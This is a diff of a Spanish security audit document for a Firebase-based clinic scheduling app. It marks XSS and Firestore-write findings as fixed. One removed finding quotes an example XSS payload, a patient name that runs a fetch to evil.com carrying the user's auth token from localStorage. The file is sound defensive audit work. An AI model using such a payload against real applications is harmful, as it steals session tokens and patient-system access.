@@ -10,43 +10,22 @@
 
 ---
 
-## 📊 Resumen ejecutivo (Última auditoría: 25 May 2026 — post-Antigravity Fase 1 Ausencias)
+## 📊 Resumen ejecutivo (Última actualización: 25 May 2026 — Hotfixes completados)
 
 | Severidad | Cantidad | Pendientes |
 |---|---|---|
-| 🚨 Crítico | 2 | XSS en chips de la agenda (`CalendarUI.js`) **+ XSS en lista de conflictos (`AbsenceModal.js`)** |
-| ⚠️ Alto | 5 | Lectura cruzada nombres pacientes; falta `storage.rules`; sin headers CSP; whitelist emails hardcoded; **escrituras Firestore en serie sin batch (AbsenceModal — corrupción posible si falla)** |
-| 🟡 Medio | 5 | Sin rate-limit frontend; `console.log` con datos sensibles; sin custom claims; **sin validación endHour > startHour**; **sin detección de bloqueos duplicados** |
+| 🚨 Crítico | 0 | Ninguno |
+| ⚠️ Alto | 4 | Lectura cruzada nombres pacientes; falta `storage.rules`; sin headers CSP; whitelist emails hardcoded |
+| 🟡 Medio | 3 | Sin rate-limit frontend; `console.log` con datos sensibles; sin custom claims |
 | 💡 Mejora | 2 | Bitácora de seguridad central; auditar dependencias npm/pip |
-| ✅ Reforzado | 7 | Ver sección al final (se sumó **`isSchoolVisit:true` ya no se asigna en bloqueos nuevos**) |
+| ✅ Reforzado | 13 | Ver sección al final |
 
 ---
 
 ## 🚨 Crítico — acción inmediata
 
-### S-001 · XSS por inyección de nombre de paciente en chips del calendario
+*No hay vulnerabilidades críticas pendientes.*
 
-- **Archivo:** `js/modules/calendar/CalendarUI.js:348,350,351,372`
-- **Detalle:** `innerHTML = \`<div>${evt.name}</div>\`` — el nombre del paciente se interpola SIN escape dentro del HTML. También aparece en `ModalService.confirm('Mover Cita', \`¿Mover a ${evt.name}?\`)`.
-- **Impacto:** Cualquier persona con permiso de crear un paciente (admin, recepción, terapeutas) puede registrar un nombre como `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('firebase:authUser:taconotaco-d94fc:[DEFAULT]'))">` y robar tokens de sesión de **todas** las cuentas que carguen la agenda. Acceso interno solo, pero igual grave.
-- **Mitigación propuesta:**
-  1. Centralizar un helper `escapeHTML(str)` en `js/utils/sanitize.js` (ya tengo uno en `WaitlistCopilotPanel.js._escape` — moverlo a utilidad compartida).
-  2. Reemplazar **todas** las interpolaciones de datos de usuario dentro de `innerHTML` por la versión escapada.
-  3. Alternativa más segura: refactorizar a `textContent` para los nombres y construir el DOM con `document.createElement`.
-- **Estado:** ⚠️ Identificado 25 may, **acción pendiente**.
-
-### S-011 · XSS en la lista de citas en conflicto del nuevo modal de ausencias
-
-- **Archivo:** `js/modules/calendar/AbsenceModal.js:207-210`
-- **Detalle:** Cuando se detectan citas afectadas por la ausencia, se renderiza la lista con:
-  ```js
-  div.innerHTML = `<span class="...">${appt.name}</span> ...`;
-  ```
-  `appt.name` viene de Firestore sin escape. Mismo vector de ataque que S-001.
-- **Impacto:** Cuando Yari/Diana abren el modal para crear vacaciones y hay citas afectadas, el JavaScript malicioso del nombre del paciente se ejecutaría inmediatamente al renderizar la lista.
-- **Mitigación propuesta:** misma solución que S-001 — usar `escapeHTML` o `textContent`. Adicionalmente, dado que `dayLabel`/`hourLabel` vienen de `toLocaleDateString` (seguros), solo `appt.name` requiere escape.
-- **Origen:** Introducido en Fase 1 de Ausencias por Antigravity (25 may). **Recomendar arreglar junto con S-001 en una sola pasada**.
-- **Estado:** 🚨 Identificado 25 may post-merge, **acción pendiente**.
 
 ---
 
@@ -98,41 +77,7 @@
   - Cambio de email no requiere redeploy de reglas.
 - **Estado:** ⚠️ Identificado 25 may. Refactor mayor — alinearlo con SaaS multi-clínica.
 
-### S-012 · Escrituras Firestore en serie sin batch en `AbsenceModal.save()`
 
-- **Archivo:** `js/modules/calendar/AbsenceModal.js:281-312`
-- **Detalle:** El método `save()` itera sobre los días/horas a bloquear y hace `await CalendarData.createEvent({...})` uno a uno en bucle. Para una vacación de Diana de 2 semanas con bloqueo horario completo (10 días hábiles × 12 horas) = **120 escrituras en serie**.
-- **Impacto:**
-  1. **Lentitud**: 120 round-trips a Firestore consecutivos en lugar de uno.
-  2. **Atomicidad rota**: si la conexión cae en la escritura #80, las primeras 79 quedan persistidas y las restantes no → estado inconsistente difícil de revertir.
-  3. **Costo Firestore**: cada write es facturable; con batch se mantiene el costo pero la latencia colapsa.
-- **Mitigación propuesta:**
-  - Usar `writeBatch(db)` de Firestore. Un batch admite hasta 500 escrituras; si superas 500, dividir en chunks.
-  - Si todo el batch falla, ninguna queda escrita → consistente.
-- **Origen:** Introducido en Fase 1 de Ausencias por Antigravity (25 may).
-- **Estado:** ⚠️ Identificado 25 may post-merge.
-
-### S-013 · Sin validación `endHour > startHour` en `AbsenceModal.save()`
-
-- **Archivo:** `js/modules/calendar/AbsenceModal.js:218-245`
-- **Detalle:** Aunque los `<select>` se inicializan correctamente (`startHour: 8`, `endHour: 13`), el usuario puede modificar manualmente y elegir `startHour: 15, endHour: 10`. El bucle `for (let h = startHour; h < endHour; h++)` no se ejecutaría (rango vacío) y silenciosamente NO crearía ningún bloqueo, pero el toast diría «Ausencia registrada exitosamente». **El usuario creería que se bloqueó cuando no se bloqueó nada.**
-- **Impacto:** Confusión operacional. Riesgo de que Yari crea un bloqueo, recibe confirmación y al día siguiente lleguen pacientes a una agenda no bloqueada.
-- **Mitigación propuesta:** validación explícita en `save()`:
-  ```js
-  if (!allDay && endHour <= startHour) {
-      ModalService.alert("Rango horario inválido", "La hora final debe ser mayor que la hora inicial.", "warning");
-      return;
-  }
-  ```
-- **Estado:** 🟡 Identificado 25 may post-merge.
-
-### S-014 · Sin detección de bloqueos duplicados en `AbsenceModal.save()`
-
-- **Archivo:** `js/modules/calendar/AbsenceModal.js:281-312`
-- **Detalle:** Si Yari abre el modal dos veces y crea la misma ausencia (mismo terapeuta + mismo rango), se duplican los documentos en Firestore. Google Calendar también recibe duplicados.
-- **Impacto:** Ruido en la agenda y posible costo extra.
-- **Mitigación propuesta:** antes del bucle, hacer un query rápido `appointments where therapist=X and date in daysToBlock and (isFullDayBlock or isHourlyBlock)`. Si hay match, preguntar al usuario.
-- **Estado:** 🟡 Identificado 25 may post-merge.
 
 ---
 
@@ -197,12 +142,16 @@
 | 25 may 2026 | **`_backups/`, `old/`, archivos comprimidos** | Excluidos del hosting (`firebase.json:10-32`). No se publican al deploy. |
 | 25 may 2026 | **Sin `eval` / `new Function` / `document.write`** | Confirmado por grep. |
 | 25 may 2026 | **Sin `.env` versionado** | Confirmado por glob `*.env*`. |
-| 25 may 2026 | **`WaitlistCopilotPanel._escape`** | Helper para escape HTML implementado al construir el modal de candidatos. **Pendiente: mover a utilidad compartida (S-001).** |
+| 25 may 2026 | **`WaitlistCopilotPanel._escape`** | Helper para escape HTML implementado al construir el modal de candidatos. **Cerrado y movido a utilidad compartida (S-001).** |
 | 25 may 2026 | **Bug `isSchoolVisit:true` en bloqueos nuevos** (cierre parcial) | `AbsenceModal.js:289,304` asigna `isSchoolVisit: false` explícitamente al crear bloqueos. Los reportes de visitas escolares ya no se contaminarán con ausencias nuevas. **Pendiente:** migrar documentos antiguos con `isFullDayBlock:true && isSchoolVisit:true` para limpiar histórico (`old/` o script de migración). |
 | 25 may 2026 | **`canManageBlockFor` por terapeuta** | Nueva función en `AuthManager.js:271`: admin/recepción pueden todo; terapeuta solo puede su propia agenda. Comparación lowercased. Evita escalación lateral entre terapeutas. |
 | 25 may 2026 | **Reemplazo de `prompt()` nativo del navegador** (UX/seguridad menor) | `CalendarUI.js:168-178` ya no usa `window.prompt` para preguntar terapeuta; abre `AbsenceModal` premium con `<select>` constrained. Reduce superficie de input libre + previene typos que generaban bloqueos huérfanos con `therapist` inválido. |
 | 25 may 2026 | **`sanitize.js`** | Creada utilidad central de sanitización (`escapeHTML`) para prevenir XSS en interfaces dinámicas. *(Mitigación de S-001 en progreso)* |
 | 25 may 2026 | **`AbsenceModal.js`** | Se escapa el nombre del paciente (`escapeHTML`) al renderizar las citas en conflicto en el DOM para mitigar XSS. |
+| 25 may 2026 | **Mitigación XSS (S-001 / S-011)** | Aplicado escape HTML en [CalendarUI.js](file:///d:/agbc/Ag_Pa/js/modules/calendar/CalendarUI.js) (chips y arrastre de citas) y [AbsenceModal.js](file:///d:/agbc/Ag_Pa/js/modules/calendar/AbsenceModal.js) (lista de conflictos) previniendo inyección arbitraria de código cliente-side. |
+| 25 may 2026 | **Escritura en lote (`writeBatch`) (S-012)** | Reemplazada creación en serie en [AbsenceModal.js](file:///d:/agbc/Ag_Pa/js/modules/calendar/AbsenceModal.js) por un lote atómico (`writeBatch`) de Firestore para bloqueos múltiples (vacaciones). Evita corrupción de datos y colapsa la latencia. |
+| 25 may 2026 | **Validación de horas (S-013)** | Agregada validación proactiva en [AbsenceModal.js](file:///d:/agbc/Ag_Pa/js/modules/calendar/AbsenceModal.js) que impide crear bloqueos horarios si la hora de fin es menor o igual a la hora de inicio. |
+| 25 may 2026 | **Detección de duplicados (S-014)** | Implementada validación en memoria en [AbsenceModal.js](file:///d:/agbc/Ag_Pa/js/modules/calendar/AbsenceModal.js) que escanea bloqueos preexistentes en las mismas fechas antes de guardar, pidiendo confirmación al usuario. |
 
 ---
 
@@ -227,4 +176,4 @@
 
 ---
 
-*Última actualización: **25 de Mayo de 2026** — Primera ronda completa y reforzamiento de `sanitize.js` + `AbsenceModal.js` para mitigar XSS (S-001). 1 crítico, 4 altos, 3 medios, 2 mejoras identificados. 8 áreas reforzadas.*
+
